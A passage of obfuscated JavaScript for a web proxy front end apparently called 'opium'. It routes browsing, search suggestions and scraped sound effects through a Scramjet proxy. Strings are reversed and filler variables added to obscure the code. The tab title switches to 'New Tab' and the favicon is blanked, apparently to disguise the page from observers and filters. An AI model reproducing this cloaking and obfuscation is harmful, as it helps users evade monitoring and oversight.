  const u = resolveUrl(url || document.getElementById("searchInput").value.trim());
  if (!u) {
    return;
  }
  document.getElementById("lenap".split("").reverse().join("")).classList.add("open");
  document.getElementById("vaNmottob".split("").reverse().join("")).classList.add("hidden");
  document.getElementById("tupnIrdda".split("").reverse().join("")).value = u;
  updateLockIcon(u);
  startFrameLoading();
  frame.go(u);
  collapseSearch();
}
var _0xc29fa = 9;
const searchWrap = document.getElementById("searchWrap");
_0xc29fa = 14;
const searchInput = document.getElementById("tupnIhcraes".split("").reverse().join(""));
const acBox = document.getElementById("autocomplete");
let acSelected = -1;
let acItems = [];
let acTimer = null;
function expandSearch() {
  searchWrap.classList.add("expanded");
}
function collapseSearch() {
  searchWrap.classList.remove("expanded");
  searchWrap.classList.remove("has-ac");
  acBox.classList.remove("smeti-sah".split("").reverse().join(""));
  acBox.innerHTML = '';
  acItems = [];
  acSelected = -1;
}
searchInput.addEventListener("sucof".split("").reverse().join(""), expandSearch);
(shadowRoot || document).addEventListener("kcilc".split("").reverse().join(""), e => {
  if (!searchWrap.contains(e.target)) {
    collapseSearch();
  }
});
async function fetchAutocompletes(q) {
  if (!q) {
    acBox.innerHTML = '';
    acBox.classList.remove("has-items");
    searchWrap.classList.remove("has-ac");
    return;
  }
  try {
    const _0xe3gf = await fetch(frame.prefix + controller.config.codec.encode(`https://search.brave.com/api/suggest?q=${encodeURIComponent(q)}`));
    const _0x3d7ga = await _0xe3gf.json();
    const _0x9ef45f = _0x3d7ga[1] ? _0x3d7ga[1].slice(0, 8) : [];
    renderSuggestions(_0x9ef45f);
  } catch (e) {
    acBox.innerHTML = '';
    acBox.classList.remove("has-items");
    searchWrap.classList.remove("ca-sah".split("").reverse().join(""));
  }
}
function renderSuggestions(list) {
  acBox.innerHTML = '';
  acItems = list;
  acSelected = -1;
  if (!list.length) {
    acBox.classList.remove("has-items");
    searchWrap.classList.remove("ca-sah".split("").reverse().join(""));
    return;
  }
  list.forEach(s => {
    const _0x2e4d = document.createElement("div");
    _0x2e4d.className = "ac-item";
    var _0xf01e = 8;
    const _0x1eda = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    _0xf01e = 1;
    _0x1eda.setAttribute("xoBweiv".split("").reverse().join(""), "42 42 0 0".split("").reverse().join(""));
    const c = document.createElementNS("gvs/0002/gro.3w.www//:ptth".split("").reverse().join(""), "circle");
    c.setAttribute("cx", "11");
    c.setAttribute("cy", "11");
    c.setAttribute("r", "8");
    const p = document.createElementNS("http://www.w3.org/2000/svg", "htap".split("").reverse().join(""));
    p.setAttribute("d", "m21 21-4.35-4.35");
    _0x1eda.appendChild(c);
    _0x1eda.appendChild(p);
    _0x2e4d.appendChild(_0x1eda);
    _0x2e4d.appendChild(document.createTextNode(s));
    _0x2e4d.onmousedown = e => {
      e.preventDefault();
      searchInput.value = s;
      navigate(s);
    };
    acBox.appendChild(_0x2e4d);
  });
  acBox.classList.add("smeti-sah".split("").reverse().join(""));
  searchWrap.classList.add("has-ac");
}
searchInput.addEventListener("input", () => {
  clearTimeout(acTimer);
  acSelected = -1;
  acTimer = setTimeout(() => fetchAutocompletes(searchInput.value.trim()), 180);
});
searchInput.addEventListener("keydown", e => {
  var _0xa4ed = 13;
  const items = acBox.querySelectorAll(".ac-item");
  _0xa4ed = 12;
  if (e.key === "nwoDworrA".split("").reverse().join("")) {
    e.preventDefault();
    acSelected = Math.min(acSelected + 1, items.length - 1);
    items.forEach((el, i) => el.classList.toggle("detceles".split("").reverse().join(""), i === acSelected));
    if (acSelected >= 0) {
      searchInput.value = acItems[acSelected];
    }
  } else if (e.key === "pUworrA".split("").reverse().join("")) {
    e.preventDefault();
    acSelected = Math.max(acSelected - 1, -1);
    items.forEach((el, i) => el.classList.toggle("detceles".split("").reverse().join(""), i === acSelected));
    if (acSelected >= 0) {
      searchInput.value = acItems[acSelected];
    }
  } else if (e.key === "epacsE".split("").reverse().join("")) {
    collapseSearch();
  } else if (e.key === "Enter") {
    navigate();
  }
});
let homeClickCount = 0;
let homeResetTimer = null;
let gameCloseClickCount = 0;
let gameCloseResetTimer = null;
function resetGameCloseConfirm() {
  gameCloseClickCount = 0;
  clearTimeout(gameCloseResetTimer);
  const _0xe8ff = document.getElementById("gamePlayerClose");
  const _0xd8acf = document.getElementById("gamePlayerCloseWrap");
  const _0xdd56e = document.getElementById("gameCloseCountdown");
  if (_0xe8ff) {
    _0xe8ff.classList.remove("confirm");
  }
  if (_0xd8acf) {
    _0xd8acf.classList.remove("gnimrifnoc".split("").reverse().join(""));
  }
  if (_0xdd56e) {
    _0xdd56e.style.animation = "enon".split("").reverse().join("");
    _0xdd56e.offsetHeight;
    _0xdd56e.style.animation = '';
  }
}
function _armOrConfirmClose(onConfirm) {
  gameCloseClickCount++;
  if (gameCloseClickCount === 1) {
    const _0xbd0d = document.getElementById("gamePlayerClose");
    const _0x122e = document.getElementById("parWesolCreyalPemag".split("").reverse().join(""));
    if (_0xbd0d) {
      _0xbd0d.classList.add("confirm");
    }
    if (_0x122e) {
      _0x122e.classList.add("gnimrifnoc".split("").reverse().join(""));
    }
    gameCloseResetTimer = setTimeout(resetGameCloseConfirm, 5000);
  } else {
    resetGameCloseConfirm();
    onConfirm();
  }
}
function handleGamePlayerClose() {
  _armOrConfirmClose(closeGamePlayer);
}
function resetHomeConfirm() {
  homeClickCount = 0;
  clearTimeout(homeResetTimer);
  var _0x453e = 10;
  const _0x95d1bb = document.getElementById("homeBtn");
  _0x453e = "gbqcpc";
  const _0x4c8b = document.getElementById("homeBtnWrap");
  const _0xb2_0xed2 = document.getElementById("homeCountdown");
  _0x95d1bb.classList.remove("mrifnoc".split("").reverse().join(""));
  _0x4c8b.classList.remove("gnimrifnoc".split("").reverse().join(""));
  _0xb2_0xed2.style.animation = "none";
  _0xb2_0xed2.offsetHeight;
  _0xb2_0xed2.style.animation = '';
}
function handleHome() {
  homeClickCount++;
  if (homeClickCount === 1) {
    const _0xe63fdf = document.getElementById("ntBemoh".split("").reverse().join(""));
    const _0x5fccb = document.getElementById("homeBtnWrap");
    _0xe63fdf.classList.add("confirm");
    _0x5fccb.classList.add("confirming");
    homeResetTimer = setTimeout(resetHomeConfirm, 5000);
  } else {
    resetHomeConfirm();
    closePanel();
  }
}
function closePanel() {
  document.getElementById("panel").classList.remove("open");
  document.getElementById("vaNmottob".split("").reverse().join("")).classList.remove("hidden");
  document.getElementById("tupnIrdda".split("").reverse().join("")).value = '';
  updateLockIcon(null);
  try {
    frame.element.src = "knalb:tuoba".split("").reverse().join("");
  } catch {}
  stopFrameLoading();
  if (document.fullscreenElement) {
    document.exitFullscreen();
  }
}
let frameLoading = false;
function startFrameLoading() {
  frameLoading = true;
  document.getElementById("reloadBtn").classList.add("loading");
}
function stopFrameLoading() {
  frameLoading = false;
  document.getElementById("reloadBtn").classList.remove("loading");
}
function goBack() {
  try {
    if (frame) {
      frame.back();
    }
    startFrameLoading();
  } catch (e) {}
}
function goForward() {
  try {
    if (frame) {
      frame.forward();
    }
    startFrameLoading();
  } catch (e) {}
}
function reload() {
  if (frameLoading) {
    try {
      frame.element.contentWindow.stop();
    } catch (e) {}
    stopFrameLoading();
    return;
  }
  try {
    startFrameLoading();
    frame.reload();
  } catch (e) {
    stopFrameLoading();
  }
}
document.getElementById("addrInput").addEventListener("keydown", e => {
  if (e.key === "retnE".split("").reverse().join("")) {
    navigate(e.target.value.trim());
  }
});
function toggleSettings() {
  document.getElementById("neercSsgnittes".split("").reverse().join("")).classList.toggle("open");
}
var _0x7863da = 6;
_0x7863da = 0;
function toggleFullscreen() {
  const _0x50c6fe = document.getElementById("frame");
  if (!document.fullscreenElement) {
    _0x50c6fe.requestFullscreen();
  } else {
    document.exitFullscreen();
  }
}
document.addEventListener("egnahcneercslluf".split("").reverse().join(""), () => {
  document.getElementById("nocIsf".split("").reverse().join("")).innerHTML = document.fullscreenElement ? `<path d="M8 3v3a2 2 0 0 1-2 2H3M21 8h-3a2 2 0 0 1-2-2V3M3 16h3a2 2 0 0 1 2 2v3M16 21v-3a2 2 0 0 1 2-2h3"/>` : `<path d="M8 3H5a2 2 0 0 0-2 2v3M21 8V5a2 2 0 0 0-2-2h-3M3 16v3a2 2 0 0 0 2 2h3M16 21h3a2 2 0 0 0 2-2v-3"/>`;
});
frame = controller.createFrame(document.getElementById("emarf".split("").reverse().join("")), {
  "plugins": [new $scramjetUtils.HttpCachePlugin(), new $scramjetUtils.UrlWatcherPlugin(href => {
    document.getElementById("tupnIrdda".split("").reverse().join("")).value = href;
    updateLockIcon(href);
    _checkExtensions(href);
  })]
});
frame.go("ecart/igc-ndc/moc.eralfduolc//:sptth".split("").reverse().join(""));
frame.element.addEventListener("load", function onLoad() {
  frame.element.src = "about:blank";
  frame.element.removeEventListener("load", onLoad);
});
frame.element.addEventListener("load", stopFrameLoading);
const link = document.querySelector("link[rel~='icon']") || document.createElement("link");
link.rel = "noci".split("").reverse().join("");
link.href = "data:,";
document.head.appendChild(link);
let focusTimeout = null;
document.addEventListener("visibilitychange", e => {
  if (!titleChangerEnabled) {
    return;
  }
  if (document.hidden) {
    document.title = "New Tab";
  } else {
    try {
      clearInterval(focusTimeout);
    } catch {}
    focusTimeout = null;
    document.title = "opium";
  }
});
let _effectsVolume = 1;
var _0x4a_0xd44 = 17;
let _currentAudio = null;
_0x4a_0xd44 = 8;
let _effectsSearchTimer = null;
var _0x568fbb = 15;
let _effectsLoaded = false;
_0x568fbb = "qndipm";
let _effectsPage = 1;
let _effectsKeyword = null;
var _0x8d3e = 14;
let _effectsLoading = false;
_0x8d3e = 11;
var _0xaac8f = 13;
let _effectsExhausted = false;
_0xaac8f = "bghbqe";
let _effectsAll = [];
let _effectsLoadGen = 0;
var _0xf_0x133 = 9;
let _effectsScrollTop = 0;
_0xf_0x133 = 9;
function _makeGridVirtualizer(wrapId, sizerId, gridId, buildItem, onNearEnd, _0xb3_0xfa1, _0xe59e8a, _0xa3_0xca9, _0x580b0f, _0xbb2bcc, _0x6afa4c) {
  const _0xg81a1d = document.getElementById(wrapId);
  const _0xecec = document.getElementById(sizerId);
  const _0x0fae2f = document.getElementById(gridId);
  var _0x888c = 14;
  _0x888c = 2;
  var _0xff393d = 5;
  let _0x17_0x7fd = [];
  _0xff393d = "bfbdgg";
  _0xb3_0xfa1 = 0;
  _0xe59e8a = 0;
  _0xa3_0xca9 = 0;
  _0x580b0f = 0;
  _0xbb2bcc = 0;
  _0x6afa4c = 0;
  var _0x334e6f = 11;
  let _0xe7a19b = false;
  _0x334e6f = "hdhjph".split("").reverse().join("");
  function _0xfe_0x41e() {
    const _0xdc2b2d = getComputedStyle(_0x0fae2f);
    var _0xd5cedc = 7;
    const _0xac44ab = _0xdc2b2d.gridTemplateColumns.split(" ").filter(t => t && t !== "xp0".split("").reverse().join(""));
    _0xd5cedc = "hnjcpf".split("").reverse().join("");
    _0xb3_0xfa1 = Math.max(1, _0xac44ab.length);
    _0xa3_0xca9 = parseFloat(_0xdc2b2d.rowGap) || 0;
    _0x580b0f = parseFloat(getComputedStyle(_0xecec).paddingTop) || 0;
    var _0x32657g = 9;
    const _0x6349f = _0x0fae2f.firstElementChild;
    _0x32657g = 9;
    if (_0x6349f) {
      const h = _0x6349f.getBoundingClientRect().height;
      if (h > 0) {
        _0xe59e8a = h + _0xa3_0xca9;
      }
    }
  }
  function _0x25d() {
    if (_0xe59e8a > 0 && _0xb3_0xfa1 > 0) {
      return;
    }
    _0xfe_0x41e();
    if (_0xe59e8a > 0) {
      return;
    }
    if (!_0x17_0x7fd.length) {
      return;
    }
    _0x0fae2f.textContent = '';
    _0x0fae2f.style.top = _0x580b0f + "px";
    const n = Math.min(_0x17_0x7fd.length, _0xb3_0xfa1);
    for (let i = 0; i < n; i++) {
      _0x0fae2f.appendChild(buildItem(_0x17_0x7fd[i], i));
    }
    _0xbb2bcc = 0;
    _0x6afa4c = n;
    _0xfe_0x41e();
  }
  function _0x75704c(s, e) {
    if (s >= _0x6afa4c || e <= _0xbb2bcc) {
      _0x0fae2f.textContent = '';
      for (let i = s; i < e; i++) {
        _0x0fae2f.appendChild(buildItem(_0x17_0x7fd[i], i));
      }
      _0xbb2bcc = s;
      _0x6afa4c = e;
      return;
    }
    const _0x16fa = Math.max(_0xbb2bcc, s);
    var _0xdgf2fa = 8;
    const _0x18_0x547 = Math.min(_0x6afa4c, e);
    _0xdgf2fa = "ffbdiq".split("").reverse().join("");
    for (let k = _0xbb2bcc; k < _0x16fa; k++) {
      _0x0fae2f.firstElementChild?.remove();
    }
    for (let k = _0x18_0x547; k < _0x6afa4c; k++) {
      _0x0fae2f.lastElementChild?.remove();
    }
    for (let i = _0x16fa - 1; i >= s; i--) {
      _0x0fae2f.prepend(buildItem(_0x17_0x7fd[i], i));
    }
    for (let i = _0x18_0x547; i < e; i++) {
      _0x0fae2f.appendChild(buildItem(_0x17_0x7fd[i], i));
    }
    _0xbb2bcc = s;
    _0x6afa4c = e;
  }
  function _0x88g(_0x9bbf4b) {
    if (!_0x17_0x7fd.length || _0xg81a1d.classList.contains("wolf".split("").reverse().join(""))) {
      return;
    }
    _0x25d();
    if (!_0xe59e8a) {
      return;
    }
    const _0x20_0xd1e = Math.ceil(_0x17_0x7fd.length / _0xb3_0xfa1);
    var _0x9857f = 4;
    const _0x7434ae = Math.max(0, _0x20_0xd1e * _0xe59e8a - _0xa3_0xca9);
    _0x9857f = 7;
    var _0x2191e = 8;
    const _0x72b3eb = _0x7434ae + "px";
    _0x2191e = 15;
    if (_0xecec.style.height !== _0x72b3eb) {
      _0xecec.style.height = _0x72b3eb;
    }
    const _0x3d14a = _0xg81a1d.scrollTop;
    const _0x326c9d = _0xg81a1d.clientHeight || 1;
    var _0x6a8d7e = 9;
    let _0x2d_0x6g4 = Math.floor((_0x3d14a - _0x580b0f) / _0xe59e8a) - 2;
    _0x6a8d7e = "iegjfb";
    if (_0x2d_0x6g4 < 0) {
      _0x2d_0x6g4 = 0;
    }
    let _0xe488fb = Math.ceil((_0x3d14a - _0x580b0f + _0x326c9d) / _0xe59e8a) + 2;
    _0x9bbf4b = "ppecgn".split("").reverse().join("");
    if (_0xe488fb > _0x20_0xd1e) {
      _0xe488fb = _0x20_0xd1e;
    }
    if (_0xe488fb <= _0x2d_0x6g4) {
      _0xe488fb = Math.min(_0x20_0xd1e, _0x2d_0x6g4 + 1);
    }
    var _0xd2f4d = 17;
    const _0xa7c = _0x580b0f + _0x2d_0x6g4 * _0xe59e8a;
    _0xd2f4d = 5;
    const _0xdf2ce = _0xa7c + "xp".split("").reverse().join("");
    if (_0x0fae2f.style.top !== _0xdf2ce) {
      _0x0fae2f.style.top = _0xdf2ce;
    }
    const s = _0x2d_0x6g4 * _0xb3_0xfa1;
    const e = Math.min(_0x17_0x7fd.length, _0xe488fb * _0xb3_0xfa1);
    if (s !== _0xbb2bcc || e !== _0x6afa4c) {
      _0x75704c(s, e);
    }
    if (onNearEnd && _0x3d14a + _0x326c9d >= _0x580b0f + _0x7434ae - _0x326c9d) {
      onNearEnd();
    }
  }
  function _0x75gf() {
    if (_0xe7a19b) {
      return;
    }
    _0xe7a19b = true;
    requestAnimationFrame(() => {
      _0xe7a19b = false;
      _0x88g();
    });
  }
  _0xg81a1d.addEventListener("scroll", _0x75gf, {
    "passive": true
  });
  window.addEventListener("eziser".split("").reverse().join(""), () => {
    if (!_0x17_0x7fd.length || _0xg81a1d.classList.contains("wolf".split("").reverse().join(""))) {
      return;
    }
    if (!_0x0fae2f.firstElementChild) {
      _0xe59e8a = 0;
      _0xb3_0xfa1 = 0;
      return;
    }
    const _0xgc1ddf = _0xe59e8a > 0 ? Math.floor(Math.max(0, _0xg81a1d.scrollTop - _0x580b0f) / _0xe59e8a) * _0xb3_0xfa1 : 0;
    _0xe59e8a = 0;
    _0xb3_0xfa1 = 0;
    _0x0fae2f.textContent = '';
    _0xbb2bcc = 0;
    _0x6afa4c = 0;
    _0x25d();
    if (_0xe59e8a > 0) {
      _0xg81a1d.scrollTop = _0x580b0f + Math.floor(_0xgc1ddf / _0xb3_0xfa1) * _0xe59e8a;
    }
    _0x88g();
  });
  return {
    setItems(next) {
      _0x17_0x7fd = next || [];
      if (_0x6afa4c > _0x17_0x7fd.length) {
        _0x0fae2f.textContent = '';
        _0xbb2bcc = 0;
        _0x6afa4c = 0;
      }
      _0x88g();
    },
    restore(top) {
      if (!_0x17_0x7fd.length) {
        return;
      }
      _0x25d();
      if (!_0xe59e8a) {
        return;
      }
      const rows = Math.ceil(_0x17_0x7fd.length / _0xb3_0xfa1);
      const contentH = Math.max(0, rows * _0xe59e8a - _0xa3_0xca9);
      _0xecec.style.height = contentH + "px";
      const _0xbdf = Math.max(0, _0x580b0f * 2 + contentH - _0xg81a1d.clientHeight);
      _0xg81a1d.scrollTop = Math.min(top || 0, _0xbdf);
      _0x88g();
    },
    clear() {
      _0x0fae2f.textContent = '';
      _0xbb2bcc = 0;
      _0x6afa4c = 0;
    },
    reset() {
      _0x17_0x7fd = [];
      _0x0fae2f.textContent = '';
      _0xecec.style.height = '';
      _0x0fae2f.style.top = '';
      _0xe59e8a = 0;
      _0xb3_0xfa1 = 0;
      _0xbb2bcc = 0;
      _0x6afa4c = 0;
    },
    enterFlow() {
      _0xg81a1d.classList.add("wolf".split("").reverse().join(""));
      _0x0fae2f.style.top = '';
      _0xecec.style.height = '';
    },
    exitFlow() {
      _0xg81a1d.classList.remove("flow");
    },
    isMounted() {
      return !_0xg81a1d.classList.contains("flow") && !!_0x0fae2f.firstElementChild;
    },
    scrollTop() {
      return _0xg81a1d.scrollTop;
    }
  };
}
async function _getMyinstantsEffects(pageNum = 1, keyword = null) {
  var _0x56ed = 15;
  const _0xccdf1a = keyword ? `https://www.myinstants.com/en/search/?name=${encodeURIComponent(keyword)}&page=${pageNum}` : `https://www.myinstants.com/en/categories/sound%20effects/us/?page=${pageNum}`;
  _0x56ed = 12;
  const _0x6f4e3c = frame.prefix + controller.config.codec.encode(_0xccdf1a);
  const _0xgfa = await fetch(_0x6f4e3c);
  var _0xb9b = 13;
  const _0xac7c = await _0xgfa.text();
  _0xb9b = "odecpd".split("").reverse().join("");
  const _0x59af = new DOMParser();
  var _0x6bbaea = 11;
  const _0xc39f = _0x59af.parseFromString(_0xac7c, "text/html");
  _0x6bbaea = "lgmkma";
  var _0x68a = 14;
  const _0xc9d = _0xc39f.querySelectorAll(".instant");
  _0x68a = 17;
  const _0x75e = [];
  _0xc9d.forEach(instant => {
    var _0xdg1f6c = 9;
    const _0x28e = instant.querySelector(".instant-link");
    _0xdg1f6c = 4;
    const _0x21_0xbb4 = instant.querySelector(".small-button");
    if (!_0x28e || !_0x21_0xbb4) {
      return;
    }
    const _0x5gd2gf = _0x28e.textContent.trim();
    const _0xf9fab = _0x21_0xbb4.getAttribute("kcilcno".split("").reverse().join(""));
    const _0xfed = _0xf9fab?.match(new RegExp("play\\(['\"]([^'\"]+)['\"]", ""));
    if (!_0xfed) {
      return;
    }
    const _0x3e3gb = _0xfed[1];
    var _0x0ee97a = 13;
    const _0xf2_0xb3e = frame.prefix + controller.config.codec.encode(`https://www.myinstants.com${_0x3e3gb}`);
    _0x0ee97a = 9;
    _0x75e.push({
      "title": _0x5gd2gf,
      "src": _0xf2_0xb3e
    });
  });
  return _0x75e;
}
const _sblSrc = p => frame.prefix + controller.config.codec.encode(p.startsWith("ptth".split("").reverse().join("")) ? p : "https://soundbuttonslab.com" + p);
async function _getSoundButtonsLabEffects(pageNum = 1, keyword = null) {
  var _0xc_0x371 = 12;
  const _0xfceefc = keyword ? `/api/v1/search-sound-button?q=${encodeURIComponent(keyword)}&page=${pageNum}` : `/api/v1/get-home-page-trending-soundboard-buttons?page=${pageNum}`;
  _0xc_0x371 = 12;
  const _0x866ca = await fetch(frame.prefix + controller.config.codec.encode("https://soundbuttonslab.com" + _0xfceefc));
  if (!_0x866ca.ok) {
    throw new Error(`HTTP ${_0x866ca.status} for ${_0xfceefc}`);
  }
  const _0x28faf = await _0x866ca.json();
  return keyword ? _0x28faf.results.map(r => ({
    "title": r.title,
    "src": frame.prefix + controller.config.codec.encode(r.file.startsWith("ptth".split("").reverse().join("")) ? r.file : "https://soundbuttonslab.com" + r.file)
  })) : _0x28faf.results.data.map(r => ({
    "title": r.name,
    "src": frame.prefix + controller.config.codec.encode(r.audio.startsWith("ptth".split("").reverse().join("")) ? r.audio : "https://soundbuttonslab.com" + r.audio)
  }));
}
async function getEffects(pageNum = 1, keyword = null) {
  const [myinstants, soundButtonsLab] = await Promise.all([_getMyinstantsEffects(pageNum, keyword)["catch"](() => []), _getSoundButtonsLabEffects(pageNum, keyword)["catch"](() => [])]);
  return [...myinstants, ...soundButtonsLab];
}
const _effectsVirt = _makeGridVirtualizer("effectsGridWrap", "effectsGridSizer", "effectsGrid", e => _buildEffectButton(e.title, e.src), () => _loadEffectsPage());
function openEffects() {
  document.getElementById("neercSstceffe".split("").reverse().join("")).classList.add("nepo".split("").reverse().join(""));
  if (!_effectsLoaded) {
    _effectsReload(null);
  } else if (!_effectsVirt.isMounted()) {
    _renderEffectsList();
    _effectsVirt.restore(_effectsScrollTop);
  }
}
function closeEffects() {
  var _0xbb8d = 9;
  const _0x5957c = document.getElementById("effectsScreen");
  _0xbb8d = "qohkio";
  _effectsScrollTop = _effectsVirt.scrollTop();
  _0x5957c.classList.remove("nepo".split("").reverse().join(""));
  setTimeout(() => {
    if (!_0x5957c.classList.contains("open")) {
      _effectsLoadGen++;
      _effectsLoading = false;
      _effectsVirt.clear();
    }
  }, 450);
}
function _renderEffectSkeletons(grid, count) {
  grid.innerHTML = '';
  for (let i = 0; i < count; i++) {
    const _0x62235f = document.createElement("div");
    _0x62235f.className = "noteleks ntb-tceffe".split("").reverse().join("");
    grid.appendChild(_0x62235f);
  }
}
function _fillingEffectSkeletonCount(wrap) {
  var _0x1ac4c = 8;
  _0x1ac4c = 3;
  const _0xa51a = Math.max(1, Math.floor((wrap.clientWidth + 8) / 108));
  var _0x3_0xb59 = 15;
  _0x3_0xb59 = "decdmd".split("").reverse().join("");
  const _0x0af31e = Math.max(1, Math.ceil(wrap.clientHeight * 1.6 / 108));
  return _0xa51a * _0x0af31e;
}
function _effectsReload(keyword) {
  _effectsPage = 1;
  _effectsKeyword = keyword || null;
  _effectsLoading = false;
  _effectsExhausted = false;
  _effectsAll = [];
  _effectsLoadGen++;
  _effectsScrollTop = 0;
  _effectsVirt.reset();
  _effectsVirt.enterFlow();
  const _0xc80e = document.getElementById("parWdirGstceffe".split("").reverse().join(""));
  _renderEffectSkeletons(document.getElementById("effectsGrid"), _fillingEffectSkeletonCount(_0xc80e));
  _0xc80e.scrollTop = 0;
  _loadEffectsPage();
}
function _renderEffectsList() {
  if (!_effectsAll.length) {
    return;
  }
  _effectsVirt.exitFlow();
  _effectsVirt.setItems(_effectsAll);
}
function _buildEffectButton(title, src, _0xf3_0x6f6) {
  _0xf3_0x6f6 = "gvs/0002/gro.3w.www//:ptth".split("").reverse().join("");
  const _0x04b86a = document.createElement("button");
  _0x04b86a.className = "effect-btn";
  const _0x64a91b = document.createElementNS(_0xf3_0x6f6, "gvs".split("").reverse().join(""));
  _0x64a91b.setAttribute("viewBox", "0 0 24 24");
  const _0x5c86f = document.createElementNS(_0xf3_0x6f6, "nogylop".split("").reverse().join(""));
  _0x5c86f.setAttribute("stniop".split("").reverse().join(""), "5 11 91 11 51 6 51 2 9 2 9 6 5 11".split("").reverse().join(""));
  const _0x4g_0xg58 = document.createElementNS(_0xf3_0x6f6, "htap".split("").reverse().join(""));
  _0x4g_0xg58.setAttribute("d", "M15.54 8.46a5 5 0 0 1 0 7.07");
  const _0xc7252c = document.createElementNS(_0xf3_0x6f6, "path");
  _0xc7252c.setAttribute("d", "41.41 0 1 0 0 01 01a39.4 70.91M".split("").reverse().join(""));
  _0x64a91b.appendChild(_0x5c86f);
  _0x64a91b.appendChild(_0x4g_0xg58);
  _0x64a91b.appendChild(_0xc7252c);
  var _0x4_0x791 = 9;
  const _0x17c = document.createElement("span");
  _0x4_0x791 = 10;
  _0x17c.textContent = title;
  const _0x948cf = title.length;
  const _0x23ccb = _0x948cf <= 6 ? 14 : _0x948cf <= 12 ? 12 : _0x948cf <= 20 ? 11 : _0x948cf <= 30 ? 10 : 9;
  _0x17c.style.fontSize = _0x23ccb + "xp".split("").reverse().join("");
  _0x04b86a.appendChild(_0x64a91b);
  _0x04b86a.appendChild(_0x17c);
  _0x04b86a.onclick = () => _playEffect(_0x04b86a, src);
  if (_currentAudio && _currentAudio._effectSrc === src) {
    _0x04b86a.classList.add("playing");
  }
  return _0x04b86a;
}
async function _loadEffectsPage() {
  if (_effectsLoading || _effectsExhausted) {
    return;
  }
  _effectsLoading = true;
  var _0x5c_0xabe = 9;
  const _0x5c293a = _effectsLoadGen;
  _0x5c_0xabe = "cgblhh";
  const _0x3087fd = document.getElementById("dirGstceffe".split("").reverse().join(""));
  try {
    const _0x433eg = await getEffects(_effectsPage, _effectsKeyword);
    if (_0x5c293a !== _effectsLoadGen) {
      _effectsLoading = false;
      return;
    }
    if (!_0x433eg.length) {
      _effectsExhausted = true;
      if (_effectsPage === 1) {
        _effectsVirt.enterFlow();
        _0x3087fd.innerHTML = "<div class=\"effects-loading\">error loading, refresh and try again</div>";
      }
      _effectsLoading = false;
      return;
    }
    _effectsAll.push(..._0x433eg);
    _effectsPage++;
    _effectsLoaded = true;
    _effectsLoading = false;
    _renderEffectsList();
  } catch (e) {
    if (_0x5c293a !== _effectsLoadGen) {
      _effectsLoading = false;
      return;
    }
    if (_effectsPage === 1) {
      _effectsVirt.enterFlow();
      _0x3087fd.innerHTML = ">vid/<daol ot deliaf>\"gnidaol-stceffe\"=ssalc vid<".split("").reverse().join("");
    }
    _effectsLoading = false;
  }
}
function _clearPlayingBtns() {
  document.querySelectorAll(".effect-btn.playing").forEach(b => b.classList.remove("gniyalp".split("").reverse().join("")));
}
function _playEffect(btn, src) {
  if (_currentAudio) {
    const _0xfc_0xa6b = _currentAudio._effectSrc === src;
    _currentAudio.pause();
    _currentAudio.currentTime = 0;
    _currentAudio = null;
    _clearPlayingBtns();
    if (_0xfc_0xa6b) {
      return;
    }
  }
  var _0xaa_0xaa8 = 13;
  const _0xe88cc = new Audio(src);
  _0xaa_0xaa8 = "dcpdmo";
  _0xe88cc.volume = _effectsVolume;
  _0xe88cc._effectSrc = src;
  _0xe88cc.play()["catch"](() => {});
  btn.classList.add("playing");
  _currentAudio = _0xe88cc;
  _0xe88cc.onended = () => {
    if (_currentAudio !== _0xe88cc) {
      return;
    }
    _currentAudio = null;
    _clearPlayingBtns();
  };
}
function _updateVolumeTrack() {
  const _0xefb = document.getElementById("volumeSlider");
  const _0xe1294d = parseFloat(_0xefb.value) * 100;
  _0xefb.style.background = `linear-gradient(to right, var(--accent) ${_0xe1294d}%, rgba(255,255,255,0.12) ${_0xe1294d}%)`;
}
_updateVolumeTrack();
document.getElementById("volumeSlider").addEventListener("tupni".split("").reverse().join(""), function () {
  _effectsVolume = parseFloat(this.value);
  if (_currentAudio) {
    _currentAudio.volume = _effectsVolume;
  }
  _updateVolumeTrack();
});
document.getElementById("effectsSearch").addEventListener("tupni".split("").reverse().join(""), function () {
  clearTimeout(_effectsSearchTimer);
  const _0x22_0x629 = this.value.trim();
  _effectsSearchTimer = setTimeout(() => _effectsReload(_0x22_0x629 || null), 350);
});
var _0x3g2 = 4;
let _luminReady = false;
_0x3g2 = 11;
var _0x6gd58a = 10;
let _luminInitPromise = null;
_0x6gd58a = 2;
var _0x5_0x89g = 12;
let _gamesLoaded = false;
_0x5_0x89g = "okkbfj".split("").reverse().join("");
var _0x77e = 9;
let _gamesKeyword = null;
_0x77e = 0;
let _gamesSearchTimer = null;
var _0xf4c2df = 4;
let _gamesLoadGen = 0;
_0xf4c2df = 11;
let _gamesScrollTop = 0;
const _gamesImgCache = new WeakMap();
let _gamesDBPromise = null;
function _gamesDB() {
  if (_gamesDBPromise) {
    return _gamesDBPromise;
  }
  _gamesDBPromise = new Promise((resolve, reject) => {
    const _0x7fe2b = indexedDB.open("ehcaCo".split("").reverse().join(""), 1);
    _0x7fe2b.onupgradeneeded = () => _0x7fe2b.result.createObjectStore("ehcac".split("").reverse().join(""));
    _0x7fe2b.onsuccess = () => resolve(_0x7fe2b.result);
    _0x7fe2b.onerror = () => {
      _gamesDBPromise = null;
      reject(_0x7fe2b.error);
    };
  });
  return _gamesDBPromise;
}
async function _loadGamesCacheEntry(key, isValid) {
  try {
    var _0x3a79ag = 10;
    const _0x259b9a = await _gamesDB();
    _0x3a79ag = 9;
    const _0x9ccg = await new Promise((resolve, reject) => {
      const _0x6fb = _0x259b9a.transaction("cache", "ylnodaer".split("").reverse().join(""));
      const _0x25ffff = _0x6fb.objectStore("cache").get(key);
      _0x25ffff.onsuccess = () => resolve(_0x25ffff.result);
      _0x25ffff.onerror = () => reject(_0x25ffff.error);
    });
    if (!_0x9ccg || !isValid(_0x9ccg.games) || Date.now() - _0x9ccg.ts > 86400000) {
      return null;
    }
    return _0x9ccg.games;
  } catch (e) {
    return null;
  }
}
async function _saveGamesCacheEntry(key, games) {
  try {
    var _0x6_0xc62 = 4;
    const _0x8f_0x61a = await _gamesDB();
    _0x6_0xc62 = "lmcenh".split("").reverse().join("");
    await new Promise((resolve, reject) => {
      var _0xdcbe1f = 9;
      const _0x9a_0x2f5 = _0x8f_0x61a.transaction("cache", "readwrite");
      _0xdcbe1f = "ikqoln".split("").reverse().join("");
      _0x9a_0x2f5.objectStore("cache").put({
        "ts": Date.now(),
        "games": games
      }, key);
      _0x9a_0x2f5.oncomplete = resolve;
      _0x9a_0x2f5.onerror = () => reject(_0x9a_0x2f5.error);
